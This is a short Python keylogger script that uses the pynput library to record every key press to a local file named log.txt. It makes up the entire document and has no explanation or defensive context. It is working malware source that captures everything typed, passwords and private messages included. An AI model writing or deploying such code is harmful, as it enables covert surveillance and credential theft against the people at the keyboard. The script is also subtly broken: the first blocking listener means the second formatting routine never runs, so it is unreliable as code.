from pynput.keyboard import Key, Listener

def call_press(key):
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

def write_to_file(key):
    with open("log.txt", 'a') as f:
        if key == Key.space:
            f.write(' ')
        elif key == Key.enter:
            f.write('\n')
        else:
            f.write(str(key).replace("'", ""))

with Listener(on_press=call_press) as listener:
    listener.join()

with Listener(on_press=write_to_file) as l:
    l.join()
